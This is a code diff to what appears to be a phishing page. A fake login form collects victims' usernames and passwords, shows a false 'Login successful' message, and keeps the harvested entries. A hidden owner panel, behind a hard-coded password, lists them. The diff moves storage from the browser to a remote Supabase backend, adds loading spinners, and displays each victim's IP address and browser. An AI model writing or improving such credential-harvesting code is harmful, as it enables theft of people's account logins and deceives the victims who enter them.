@@ -309,6 +309,31 @@
         box-shadow: 0 8px 16px rgba(107, 114, 128, 0.3);
     }
     
+    /* Loading state */
+    .loading {
+        opacity: 0.6;
+        pointer-events: none;
+    }
+    
+    .loading::after {
+        content: '';
+        position: absolute;
+        top: 50%;
+        left: 50%;
+        width: 20px;
+        height: 20px;
+        margin: -10px 0 0 -10px;
+        border: 2px solid #FFFC00;
+        border-top: 2px solid transparent;
+        border-radius: 50%;
+        animation: spin 1s linear infinite;
+    }
+    
+    @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+    }
+    
     /* Accessibility & focus */
     button:focus, input:focus {
         outline-offset: 2px;
@@ -362,7 +387,9 @@
     <div id="credList" class="cred-list" aria-live="polite" aria-relevant="additions"></div>
 </div>
 
-<script>
+<script type="module">
+  import { addCredential, getCredentials, authenticateOwner } from './src/supabase.js';
+
   // Constants
   const OWNER_PASSWORD = 'owneraccess123';
 
@@ -384,53 +411,57 @@
       .replace(/'/g, "&#039;");
   }
 
-  // Load credentials array from localStorage or return empty array
-  function loadCredentials() {
-    const creds = localStorage.getItem('credentials');
+  // Format date for display
+  function formatDate(dateString) {
     try {
-      return creds ? JSON.parse(creds) : [];
+      return new Date(dateString).toLocaleString();
     } catch {
-      localStorage.removeItem('credentials');
-      return [];
+      return dateString;
     }
   }
 
-  // Save credentials array to localStorage
-  function saveCredentials(creds) {
-    localStorage.setItem('credentials', JSON.stringify(creds));
+  // Show loading state
+  function showLoading(element) {
+    element.classList.add('loading');
   }
 
-  // Add a new credential
-  function addCredential(username, password) {
-    const creds = loadCredentials();
-    creds.push({
-      id: Date.now() + '-' + Math.random().toString(36).slice(2),
-      username: username || 'N/A',
-      password: password || 'N/A',
-      timestamp: new Date().toLocaleString()
-    });
-    saveCredentials(creds);
+  // Hide loading state
+  function hideLoading(element) {
+    element.classList.remove('loading');
   }
 
   // Render credentials in owner page
-  function renderCredentials() {
-    const creds = loadCredentials();
-    if (creds.length === 0) {
-      credList.innerHTML = '<p style="text-align: center; color: #6b7280; font-style: italic;">No credentials collected yet.</p>';
-      return;
+  async function renderCredentials() {
+    showLoading(credList);
+    
+    try {
+      const creds = await getCredentials();
+      
+      if (creds.length === 0) {
+        credList.innerHTML = '<p style="text-align: center; color: #6b7280; font-style: italic;">No credentials collected yet.</p>';
+        return;
+      }
+      
+      credList.innerHTML = '';
+      creds.forEach(cred => {
+        const div = document.createElement('div');
+        div.className = 'cred-entry';
+        div.setAttribute('tabindex', '0');
+        div.innerHTML = `
+          <div class="cred-field"><strong>Username:</strong> ${escapeHtml(cred.username)}</div>
+          <div class="cred-field"><strong>Password:</strong> ${escapeHtml(cred.password)}</div>
+          <div class="cred-field"><strong>IP Address:</strong> ${escapeHtml(cred.ip_address || 'Unknown')}</div>
+          <div class="cred-field"><strong>Browser:</strong> ${escapeHtml(cred.user_agent ? cred.user_agent.substring(0, 50) + '...' : 'Unknown')}</div>
+          <div class="cred-field" style="font-size:0.85rem; color:#6b7280; margin-top:12px;">Submitted: ${escapeHtml(formatDate(cred.created_at))}</div>
+        `;
+        credList.appendChild(div);
+      });
+    } catch (error) {
+      credList.innerHTML = '<p style="text-align: center; color: #ef4444;">Error loading credentials. Please try again.</p>';
+      console.error('Error rendering credentials:', error);
+    } finally {
+      hideLoading(credList);
     }
-    credList.innerHTML = '';
-    creds.slice().reverse().forEach(cred => {
-      const div = document.createElement('div');
-      div.className = 'cred-entry';
-      div.setAttribute('tabindex', '0');
-      div.innerHTML = `
-        <div class="cred-field"><strong>Username:</strong> ${escapeHtml(cred.username)}</div>
-        <div class="cred-field"><strong>Password:</strong> ${escapeHtml(cred.password)}</div>
-        <div class="cred-field" style="font-size:0.85rem; color:#6b7280; margin-top:12px;">Submitted: ${escapeHtml(cred.timestamp)}</div>
-      `;
-      credList.appendChild(div);
-    });
   }
 
   // Clear input fields
@@ -441,17 +472,36 @@
   }
 
   // Handle form submission
-  loginForm.addEventListener('submit', function(event) {
+  loginForm.addEventListener('submit', async function(event) {
     event.preventDefault();
+    
     const username = loginForm.username.value.trim();
     const password = loginForm.password.value;
+    
     if (!username || !password) {
       alert('Please enter both username and password.');
       return;
     }
-    addCredential(username, password);
-    clearInputs();
-    alert('Login successful! Redirecting...');
+
+    // Show loading state
+    const submitBtn = event.target.querySelector('button[type="submit"]');
+    showLoading(submitBtn);
+    
+    try {
+      const success = await addCredential(username, password);
+      
+      if (success) {
+        clearInputs();
+        alert('Login successful! Redirecting...');
+      } else {
+        alert('Login failed. Please try again.');
+      }
+    } catch (error) {
+      console.error('Error submitting credentials:', error);
+      alert('Login failed. Please try again.');
+    } finally {
+      hideLoading(submitBtn);
+    }
   });
 
   // Owner logout button click
@@ -465,15 +515,25 @@
   refreshCredListBtn.addEventListener('click', renderCredentials);
 
   // Owner login function called by onclick inline attribute
-  function ownerLogin() {
+  async function ownerLogin() {
     const enteredPass = prompt('Enter owner password to access collected credentials:');
-    if (enteredPass === OWNER_PASSWORD) {
-      loginPage.style.display = 'none';
-      ownerPage.style.display = 'flex';
-      renderCredentials();
-      ownerLogoutBtn.focus();
-    } else if (enteredPass !== null) {
-      alert('Incorrect password.');
+    
+    if (enteredPass === null) return; // User cancelled
+    
+    try {
+      const isAuthenticated = await authenticateOwner(enteredPass);
+      
+      if (isAuthenticated) {
+        loginPage.style.display = 'none';
+        ownerPage.style.display = 'flex';
+        await renderCredentials();
+        ownerLogoutBtn.focus();
+      } else {
+        alert('Incorrect password.');
+      }
+    } catch (error) {
+      console.error('Authentication error:', error);
+      alert('Authentication failed. Please try again.');
     }
   }
 
